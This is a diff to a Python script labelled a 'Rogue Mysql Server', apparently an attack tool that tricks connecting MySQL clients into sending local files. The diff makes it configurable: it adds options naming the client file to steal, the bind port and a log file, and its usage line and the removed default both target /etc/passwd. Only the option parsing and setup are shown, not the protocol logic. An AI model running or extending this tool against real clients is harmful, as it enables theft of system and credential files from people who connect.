@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 #coding: utf8
 
-
+from optparse import OptionParser 
 import socket
 import asyncore
 import asynchat
@@ -10,21 +10,31 @@ import random
 import logging
 import logging.handlers
 
+parser = OptionParser(usage="usage: %prog -f xxx.log -p 3306 -r /etc/passwd")
+parser.add_option("-f", "--file", action="store", type="string", help="client read file name")
+parser.add_option("-p", "--port", action="store", type="int", help="bind port")
+parser.add_option("-o", "--out", action="store", type="string", help="mysql log filename")
+
+(options, args) = parser.parse_args()
+
+if options.file == None or options.out == None or options.port == None:
+    parser.print_help()
+    exit()
 
 #Set Rogue Mysql Server bind port
-PORT = 3308
+PORT = options.port
 
 log = logging.getLogger(__name__)
 
 log.setLevel(logging.INFO)
-tmp_format = logging.handlers.WatchedFileHandler('mysql.log', 'ab')
+tmp_format = logging.handlers.WatchedFileHandler(options.out, 'ab')
 tmp_format.setFormatter(logging.Formatter("%(asctime)s:%(levelname)s:%(message)s"))
 log.addHandler(
     tmp_format
 )
 
 filelist = (
-    '/etc/passwd',
+    options.file,
 )
 
 
